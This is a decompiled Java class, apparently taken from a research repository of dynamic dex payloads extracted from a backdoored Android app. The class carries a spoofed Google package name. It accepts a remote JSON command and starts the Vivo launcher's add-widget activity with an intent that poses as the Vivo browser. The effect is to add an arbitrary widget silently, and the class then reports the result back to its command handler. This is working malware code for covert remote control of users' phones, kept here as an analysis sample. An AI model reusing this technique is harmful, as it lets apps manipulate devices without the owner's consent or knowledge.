package com.google.android.sd.biz_dynamic_dex.vivo_widget;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import org.json.JSONObject;

public class VivoAddWidgetExecutor extends DynamicCmdExecutor {
  private static final int CMD = 10;
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    if (TextUtils.isEmpty(paramString))
      return; 
    JSONObject jSONObject = new JSONObject(paramString);
    CmdData cmdData = new CmdData(10, jSONObject.getString("uuid"), "client");
    if (!isReadyToExecute(paramContext)) {
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, "not_ready", null));
      return;
    } 
    String str = jSONObject.optString("component");
    if (TextUtils.isEmpty(str)) {
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, "params_invalid", null));
      return;
    } 
    try {
      ComponentName componentName = ComponentName.unflattenFromString(str);
      Intent intent = new Intent();
      intent.addFlags(0);
      intent.setAction("vivo.intent.action.WIDGET_ADD");
      intent.putExtra("packageName", "com.vivo.browser");
      intent.putExtra("className", "com.vivo.browser.BrowserActivity");
      intent.putExtra("widgetPackageName", componentName.getPackageName());
      intent.putExtra("widgetClassName", componentName.getClassName());
      intent.setComponent(new ComponentName("com.bbk.launcher2", "com.bbk.launcher2.ui.widget.VivoAddWidgetActivity"));
      intent.setAction("com.bbk.launcher.addwidget");
      intent.addFlags(268435456);
      paramContext.startActivity(intent);
      CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(cmdData, null, null));
      return;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("exception_");
      stringBuilder.append(exception.getMessage());
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, stringBuilder.toString(), null));
      return;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\f9b6b139-4516-4ac2-896d-8bc3eb1f2d03-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_widget\VivoAddWidgetExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */